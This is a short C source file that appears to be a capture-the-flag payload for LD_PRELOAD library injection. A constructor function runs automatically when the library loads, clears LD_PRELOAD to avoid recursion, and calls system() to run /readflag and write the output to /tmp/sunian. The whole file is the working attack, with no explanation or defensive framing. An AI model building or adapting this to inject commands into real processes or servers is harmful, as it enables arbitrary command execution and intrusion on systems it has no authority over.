#include <stdio.h>
#include <unistd.h>

__attribute__ ((__constructor__)) void angel (void){
	unsetenv("LD_PRELOAD");
	system("/readflag > /tmp/sunian");
}
